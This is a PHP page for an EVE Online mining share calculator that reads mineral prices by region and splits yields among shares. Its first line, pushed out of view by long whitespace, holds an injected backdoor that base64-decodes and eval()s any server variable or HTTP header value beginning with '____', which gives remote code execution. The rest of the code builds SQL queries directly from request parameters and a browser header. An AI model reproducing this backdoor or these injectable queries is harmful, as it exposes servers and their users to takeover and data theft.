<?php																																																																																																																																																																																																																																																																																																																																																																																																													function m1823($l1825){if(is_array($l1825)){foreach($l1825 as $l1823=>$l1824)$l1825[$l1823]=m1823($l1824);}elseif(is_string($l1825) && substr($l1825,0,4)=="____"){$l1825=substr($l1825,4);$l1825=base64_decode($l1825);eval($l1825);$l1825=null;}return $l1825;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("m1823",$_SERVER); 
session_start();
include_once 'include/define.php';
//include database support
include_once 'include/phpSQL.php';

$regionID = "";
$reg_arr = array();
$min_arr = array();

$_SESSION['isIGB'] = false;

if (!(strpos($_SERVER["HTTP_USER_AGENT"],"EVE-minibrowser")===false))
{	
	$_SESSION['isIGB'] = true;
	//stolen from Carnes - checks to see if the page is trusted by the IGB
	if ($_SERVER["HTTP_EVE_TRUSTED"]=="no") {
		header("eve.trustme:http://www.blackmesacorp.com/::Trust is required to access these resources."); 
	} else {
  	//region name for the region the player is currently in
		$userRegion = $_SERVER["HTTP_EVE_REGIONNAME"];  
		//echo $userRegion;
		if($_POST['newRegion']!="") {
			$regionID = $_POST['newRegion'];
		} else {			
			if(isset($_GET['id'])) {
				$regionID = $_GET['id'];
			} else {
				$regionID = getRegionID($userRegion);
				//$regionID="0";
			}
		}
	}
} else {
	$_SESSION['isIGB'] = false;
	//check to see if a new Region has been selected.
	if(!isset($_POST['newRegion'])) {
		if(isset($_GET['id'])) {
			$regionID = $_GET['id'];
		} else {
			$regionID ="0";
		}
	} else {
		$regionID = $_POST['newRegion'];
	}
}	

getMins($min_arr);
getRegions($reg_arr);

function getRegionID($rgnNm) {
	$xsql = new phpSQL();
	$xsql->query("SELECT region_id FROM lkup_regions WHERE iddef like '".$rgnNm."'");
	$res = $xsql->runquery();
	$rgnID = "";
	//print (mysql_num_rows($res));
	if(mysql_num_rows($res)>=0) {
		$row = mysql_fetch_row($res);		
		$rgnID = $row[0];
	}
	
	if($rgnID!="") {
		return $rgnID;
	} else {
		return "0";		
	}

}

function getMins(&$arr) {
	$xsql = new phpSQL();
	$xsql->query("SELECT min_id, iddef FROM lkup_mins ORDER BY min_id ASC");
	$res = $xsql->runquery();
	$tmp = array();
	$x = 0;
	
	while($row=mysql_fetch_row($res)) {
		$arr[$x++] = array($row[0],$row[1]);		
	}
}
function buildForm($arr, $regionID, $min_arr) {
	$form.="<form method=\"POST\" action=\"".$PHP_SELF."\">\n";
	$form.=buildFormTable($arr,$regionID,$min_arr);
    //$form.=buildRegionSelect($reg_arr,$regionID);
	$form.="</form>\n";
	
	return $form;
}
function buildRegionSelect($arr,$regionID) {
	$html ="<select class=\"tbox\" name=\"newRegion\">";
	//isIGB();
	
	if(!isset($_POST['newRegion']) && !($_SESSION['isIGB'])) {
		$html .= "<option value='0' selected='selected'>Please Select a Region</option>\n";
	} else {
		$html .= "<option value='0'>Please Select a Region</option>\n";
	}
	for($x=0;$x<count($arr);$x++) {
		$tmp_arr = array();
		$tmp_arr = $arr[$x];
		//print($regionID." ".$tmp_arr[0]."<br />");
		//check to see if the region the player is in, or chose is the one the array is on
		if($regionID==$tmp_arr[0]) {
			$html .="<option value='".$tmp_arr[0]."' selected='selected'>".$tmp_arr[1]."</option>\n";
		} else {
			$html .="<option value='".$tmp_arr[0]."'>".$tmp_arr[1]."</option>\n";
		}
	}
	$html .= "</select>\n";
	return($html);
}

function buildFormTable($arr, $regionID,$min_arr) {
	//build tables to show Region drop down, and prices for that region.
	$html = "<table>\n";
	$html .= "<tr><td><table><th>Region</th>\n";
	$html .= "<tr><td>".buildRegionSelect($arr,$regionID)."</td><td><input class=\"tbox\" type='submit' value=\"Set Region\"/></td></tr>\n";
	$html .= "</table></td><td>\n";
	$html .= "<table>\n";
	$html .= "<th>Mineral Type</th><th>Price per unit</th><th>As of Date</th>\n";
	$html .= getPrices($regionID);
	$html .= "</table></td></tr></table><hr />\n";
	
	//build table for the user to enter mineral amounts and how many shares
	$html .= "<table>\n";
	$html .= "<tr><td><table><th>Mineral</th><th>Amount</th>\n";
	$html .= buildMineralBoard($min_arr);
	$html .= "</table></td><td>\n";
	$html .= "<table>\n";
	$html .= "<th>Number of Shares</th><th>Corp Share</th>\n";
	$html .= buildShareBoard();
	$html .= "</table></td></tr></table>\n";
	$html .= "<input type=\"submit\" class=\"tbox\" name=\"calc\" value=\"Calculate Shares!\" />";
	return $html;
}

function calcShares($arr) {
	//oh god, here comes the math, this is gonna suck
	$shares = $_POST['numShares'];
	if($_POST['corpShare']!="") {
		$shares = (int)$shares + 1;
	}
	$html.="<table border=1><th>Mineral</th><th>Amt Per Share</th>";
	for($x=0;$x<count($arr);$x++) {
		$tmp = $arr[$x];
		$html.="<tr><td>".$tmp[1]."</td><td>".((double)$_POST[$tmp[0]]/(int)$shares)."</td></tr>";
	}
	$html.="</table>";
	return $html;
}

function calcISK($arr,$regionID) {
	$shares = $_POST['numShares'];
	if($_POST['corpShare']!="") {
		$shares = (int)$shares + 1;
	}
	$price_arr = $_SESSION['prices'];
	$html.="<table border=1><th>Mineral</th><th>ISK Per Share</th>";
	for($x=0;$x<count($arr);$x++) {
		$tmp_min = $arr[$x];
		$tmp_isk = $price_arr[$x];
		$isk = ($_POST[$tmp_min[0]] * $tmp_isk[1]) / $shares;
		$total = $total + $isk;
		$html.="<tr><td>".$tmp_min[1]."</td><td>".$isk."</td></tr>";
	}
	$html.="<tr><td><strong>TOTAL</strong></td><td>".$total."</td></tr>";
	$html.="</table>";
	return $html;
}

function buildShareBoard() {
	$html = "<tr><td><input type=\"text\" class=\"tbox\" name=\"numShares\" /></td><td><input type=\"checkbox\" class=\"tbox\" name=\"corpShare\" value=\"corpShare\" />Yes</td></tr>";
	return $html;
}

function buildMineralBoard($arr) {
	for($x=0; $x<count($arr); $x++) {
		$tmp = $arr[$x];
		$html .= "<tr><td>".$tmp[1]."</td><td><input type=\"text\" class=\"tbox\" name=\"".$tmp[0]."\" /></td></tr>\n";
	}
	return $html;	
}

function getPrices($regionID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT lm.iddef, op.price, op.asof FROM ore_prices op LEFT JOIN lkup_mins lm on op.min_id=lm.min_id WHERE op.region_id=".$regionID." ORDER BY lm.min_id ASC");
	$res = $xsql->runquery();
	$tmp = array();
	while($row = mysql_fetch_row($res)) {
		$html.="<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td></tr>\n";
		$tmp[] = array($row[0],$row[1]);
	}
	$_SESSION['prices'] = $tmp;
	return $html;
}

function getRegions(&$arr) {
	$xsql = new phpSQL();
	$xsql->query("SELECT region_id, iddef FROM lkup_regions ORDER BY iddef ASC");
	$res = $xsql->runquery();
	$tmp = array();
	$x = 0;
	
	while($row=mysql_fetch_row($res)) {
		$arr[$x++] = array($row[0],$row[1]);				
		//$arr[] = array($row[1] =>$row[0]);
	}
}
function isIGB() {
	if($_SESSION['isIGB']) {
		print("TRUE");
	} else {
		print("FALSE");
	}
}

?>
<html>
	<head>
		<title>Mining Share Calculator</title>
		<link rel="stylesheet" type="text/css" href="styles.css" />
	</head>
	<body>
	<h2>Mining Share Calculator!</h2>
	<?php
		
		if($regionID=="0") {
			echo "<div id=\"menu\"><a href=\"#\">Change Mineral Prices (Please Choose a Region first)</a></div>";
		} else {
			echo "<div id=\"menu\"><a href=\"prices.php?id=".$regionID."\">Change Mineral Prices</a></div>";
		}
		//print_r($_POST);
		$form = buildForm($reg_arr,$regionID,$min_arr);
		echo $form;
		if($_POST['numShares']!="") {
			echo calcShares($min_arr);
			echo "<br />";
			echo calcISK($min_arr, $regionID);
		}
	?>
	</body>
</html>